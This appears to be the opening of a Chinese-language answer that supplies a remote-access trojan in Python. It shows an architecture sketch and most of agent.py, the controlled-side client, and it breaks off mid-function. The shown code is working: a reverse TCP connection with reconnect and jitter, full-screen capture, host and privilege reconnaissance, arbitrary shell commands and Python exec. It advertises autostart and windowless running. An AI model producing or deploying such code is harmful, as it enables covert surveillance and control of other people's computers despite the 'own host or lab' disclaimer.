[k] Code: 完整远控（服务端 + 客户端），反向连接、实时屏幕流、文件上传下载、远程 shell、开机自启、断线重连，纯标准库 + Tkinter（截图 JPEG 用 Pillow，可选 mss 提速）。

## 架构

```
agent.py  (被控端)  --TCP 反向连接-->  server.py (控制端, Tk GUI / CLI)
帧格式:  [4B 大端长度][1B 类型][4B 大端 header_len][header JSON][binary blob]
类型:    1=JSON控制/事件  2=shell输出  3=屏幕帧  4=文件块  5=错误  6=心跳
```

---

## 1. `agent.py`（被控端）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
agent.py — 反向连接被控端（OPERATOR 自有主机 / 隔离实验环境）
功能：实时屏幕流 / 文件上传下载 / 远程 shell / 开机自启 / 断线重连 / 心跳
依赖：仅标准库；JPEG 截图建议 Pillow(pip install pillow)，高速抓屏建议 mss(pip install mss)
用法：python agent.py <server_ip> <port>        (Windows 建议用 pythonw.exe 无窗口运行)
"""
import os, sys, io, json, time, random, socket, struct, subprocess, threading, shutil
import platform, traceback, tempfile

# ----------------------------- 配置 -----------------------------
HOST = os.environ.get("AGT_HOST", "127.0.0.1")
PORT = int(os.environ.get("AGT_PORT", "4444"))
RECONNECT = float(os.environ.get("AGT_RECONNECT", "5"))   # 断线重连间隔(秒)
JITTER = float(os.environ.get("AGT_JITTER", "0"))         # 随机抖动上限(秒)
HB = 20.0                                                 # 心跳间隔(秒)
CHUNK = 1 << 16                                           # 文件分块 64KiB
CWD = os.getcwd()

# ----------------------------- 帧协议 -----------------------------
MT_JSON, MT_RESULT, MT_SHOT, MT_FILE, MT_ERR, MT_PONG = 1, 2, 3, 4, 5, 6

def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        b = sock.recv(n - len(buf))
        if not b:
            raise ConnectionError("peer closed")
        buf += b
    return bytes(buf)

def send_frame(sock, mtype, header=None, blob=b""):
    h = json.dumps(header or {}, ensure_ascii=False).encode("utf-8")
    body = struct.pack(">BI", mtype, len(h)) + h + blob
    sock.sendall(struct.pack(">I", len(body)) + body)

def recv_frame(sock):
    n = struct.unpack(">I", recv_exact(sock, 4))[0]
    if n > (1 << 30):
        raise ValueError("frame too large")
    body = recv_exact(sock, n)
    mtype = body[0]
    (hlen,) = struct.unpack(">I", body[1:5])
    header = json.loads(body[5:5 + hlen].decode("utf-8") or "{}")
    return mtype, header, body[5 + hlen:]

# ----------------------------- 抓屏 -----------------------------
def _bgra_to_bgr(bgra):
    ba = bytearray(bgra)
    del ba[3::4]          # 删除每个像素第 4 字节(A) => 剩下 BGR 顺序
    return bytes(ba)

def _bmp24(w, h, bgra):
    bgr = _bgra_to_bgr(bgra)
    row = w * 3
    pad = (-row) % 4
    stride = row + pad
    size = stride * h
    out = bytearray(struct.pack("<2sIHHI", b"BM", 14 + 40 + size, 0, 0, 14 + 40))
    out += struct.pack("<IiiHHIIiiII", 40, w, h, 1, 24, 0, size, 2835, 2835, 0, 0)
    for y in range(h - 1, -1, -1):          # BMP 自下而上
        o = y * row
        out += bgr[o:o + row]
        if pad:
            out += b"\x00" * pad
    return bytes(out)

def _grab_mss():
    import mss
    with mss.mss() as sct:
        s = sct.grab(sct.monitors[0])       # 全虚拟桌面
        return s.width, s.height, bytes(s.bgra)

def _grab_windows():
    import ctypes
    from ctypes import wintypes
    u32, g32 = ctypes.windll.user32, ctypes.windll.gdi32
    try:
        u32.SetProcessDPIAware()
    except Exception:
        pass
    w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
    hdc = u32.GetDC(0)
    mdc = g32.CreateCompatibleDC(hdc)
    bmp = g32.CreateCompatibleBitmap(hdc, w, h)
    g32.SelectObject(mdc, bmp)
    g32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)   # SRCCOPY

    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                    ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]
    bi = BIH()
    bi.biSize = ctypes.sizeof(BIH)
    bi.biWidth, bi.biHeight = w, -h        # 负数 = top-down
    bi.biPlanes, bi.biBitCount, bi.biCompression = 1, 32, 0
    buf = ctypes.create_string_buffer(w * h * 4)
    g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    g32.DeleteObject(bmp); g32.DeleteDC(mdc); u32.ReleaseDC(0, hdc)
    return w, h, buf.raw

def _grab_unix_cmd():
    from PIL import Image
    fd, tmp = tempfile.mkstemp(suffix=".png"); os.close(fd)
    try:
        if shutil.which("scrot"):
            subprocess.run(["scrot", "-o", tmp], check=True, capture_output=True)
        elif shutil.which("import"):
            subprocess.run(["import", "-window", "root", tmp], check=True, capture_output=True)
        else:
            raise RuntimeError("需要 mss / scrot / ImageMagick 之一")
        img = Image.open(tmp).convert("RGB")
        w, h = img.size
        return w, h, img.tobytes("raw", "BGRX")
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass

def grab():
    fns = [_grab_mss, _grab_windows if sys.platform.startswith("win") else _grab_unix_cmd]
    last = None
    for fn in fns:
        try:
            return fn()
        except Exception as e:
            last = e
    raise RuntimeError("抓屏失败：安装 Pillow/mss 后重试 (%s)" % last)

def grab_image(quality=50, scale=1.0):
    w, h, bgra = grab()
    try:
        from PIL import Image
        img = Image.frombytes("RGB", (w, h), bgra, "raw", "BGRX")
        if scale and scale != 1.0:
            img = img.resize((max(1, int(w * scale)), max(1, int(h * scale))))
        bio = io.BytesIO()
        img.save(bio, "JPEG", quality=int(quality))
        return bio.getvalue(), {"w": w, "h": h, "fmt": "jpeg"}
    except ImportError:
        return _bmp24(w, h, bgra), {"w": w, "h": h, "fmt": "bmp"}

# ----------------------------- 系统 / 执行 -----------------------------
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "0.0.0.0"

def is_admin():
    try:
        if sys.platform.startswith("win"):
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False

def sysinfo():
    return {
        "host": socket.gethostname(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
        "os": platform.platform(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "cwd": CWD,
        "py": sys.version.split()[0],
        "exe": sys.executable,
        "ip": local_ip(),
        "admin": is_admin(),
        "ts": time.time(),
    }

def do_shell(line):
    p = None
    try:
        p = subprocess.Popen(line, shell=True, cwd=CWD,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out, _ = p.communicate(timeout=180)
        return p.returncode, out or b""
    except subprocess.TimeoutExpired:
        try:
            p.kill()
        except Exception:
            pass
        return -1, b"[timeout]"
    except Exception as e:
        return -1, repr(e).encode()

def do_pyexec(code):
    g = {"__name__": "__agent__"}
    buf, old = io.StringIO(), sys.stdout
    try:
        sys.stdout = buf
        exec(code, g)
        return (buf.getvalue() or "ok").encode()
    except Exception:
        return traceback.format_exc().encode()
    finally:
        sys.stdout = old

def list_dir(path):
    path = os.path.expanduser(path or CWD)
    if not os.path.isabs(path):
        path = os.path.join(CWD, path)
    items = []
